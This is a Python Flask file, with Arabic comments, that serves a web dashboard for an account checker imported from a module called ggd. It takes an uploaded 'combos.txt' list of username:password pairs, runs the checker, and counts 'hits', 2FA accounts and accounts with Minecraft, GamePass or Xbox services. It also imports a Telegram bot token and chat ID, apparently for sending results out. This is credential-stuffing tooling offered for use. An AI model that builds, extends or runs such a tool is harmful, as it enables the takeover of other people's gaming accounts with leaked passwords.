from flask import Flask, render_template, jsonify, request
import threading
import time
import os
import json
import sys
from datetime import datetime

# ============================================================
# استيراد أداة الفحص الحقيقية (ggd.py)
# ============================================================
import ggd
from ggd import stats, check_account, FILE_MAP, bot, BOT_TOKEN, CHAT_ID

app = Flask(__name__)

# ============================================================
# حالة الفحص
# ============================================================
running = False
current_combos = []
stop_event = threading.Event()

def get_stats():
    """جلب الإحصائيات من أداة ggd.py"""
    with stats._lock:
        return {
            "total": len(current_combos),
            "hits": stats.hits,
            "twofa": stats.twofa,
            "bad": stats.bad,
            "progress": int((stats.checked / max(1, len(current_combos))) * 100),
            "status": "SCANNING" if running else "COMPLETED" if stats.checked > 0 else "READY",
            "services": {
                "Minecraft": stats.minecraft,
                "GamePass": stats.gamepass,
                "Xbox": stats.xbox,
                "NotLinked": stats.not_linked,
            }
        }

def get_logs():
    """جلب السجلات من ggd.py"""
    with stats._lock:
        return [
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"Checked: {stats.checked}", "type": "info"},
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"Hits: {stats.hits}", "type": "ok"},
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"Bad: {stats.bad}", "type": "warn"},
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"2FA: {stats.twofa}", "type": "info"},
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"Minecraft: {stats.minecraft}", "type": "ok"},
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"GamePass: {stats.gamepass}", "type": "ok"},
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"Xbox: {stats.xbox}", "type": "info"},
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"NotLinked: {stats.not_linked}", "type": "info"},
        ]

# ============================================================
# تشغيل الفحص في خيط منفصل
# ============================================================
def run_checker():
    global running, current_combos, stop_event
    
    if not current_combos:
        with stats._lock:
            stats.checked = 0
            stats.hits = 0
            stats.bad = 0
            stats.twofa = 0
            stats.minecraft = 0
            stats.gamepass = 0
            stats.xbox = 0
            stats.not_linked = 0
            stats.errors = 0
        return

    running = True
    stop_event.clear()
    stats.start_time = time.time()

    def checker_thread():
        try:
            ggd.start_checking()
        except Exception as e:
            print(f"Error in checker: {e}")
        finally:
            global running
            running = False

    thread = threading.Thread(target=checker_thread, daemon=True)
    thread.start()

# ============================================================
# مسارات API
# ============================================================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"error": "No file"}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No file selected"}), 400
    file.save('combos.txt')
    return jsonify({"message": "File uploaded successfully!"})

@app.route('/api/start', methods=['POST'])
def start():
    global current_combos, running
    if running:
        return jsonify({"status": "already_running"})
    
    combo_file = "combos.txt"
    if not os.path.exists(combo_file):
        return jsonify({"status": "error", "message": "combos.txt not found"})
    
    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        current_combos = [line.strip() for line in f if line.strip() and ':' in line]
    
    if not current_combos:
        return jsonify({"status": "error", "message": "No valid combos found"})
    
    ggd.Combos = current_combos
    
    with stats._lock:
        stats.checked = 0
        stats.hits = 0
        stats.bad = 0
        stats.twofa = 0
        stats.minecraft = 0
        stats.gamepass = 0
        stats.xbox = 0
        stats.not_linked = 0
        stats.errors = 0
        stats.start_time = time.time()
    
    run_checker()
    return jsonify({"status": "started"})

@app.route('/api/status')
def status():
    return jsonify(get_stats())

@app.route('/api/logs')
def logs():
    return jsonify(get_logs())

@app.route('/api/reset', methods=['POST'])
def reset():
    global running, current_combos
    running = False
    current_combos = []
    with stats._lock:
        stats.checked = 0
        stats.hits = 0
        stats.bad = 0
        stats.twofa = 0
        stats.minecraft = 0
        stats.gamepass = 0
        stats.xbox = 0
        stats.not_linked = 0
        stats.errors = 0
    return jsonify({"status": "reset"})

# ============================================================
# تشغيل الخادم
# ============================================================
if __name__ == '__main__':
    print("""
    ═══════════════════════════════════════════
      DroopFile Dashboard
      الرابط: http://127.0.0.1:5000
    ═══════════════════════════════════════════
    """)
    app.run(debug=True, host='0.0.0.0', port=5000)
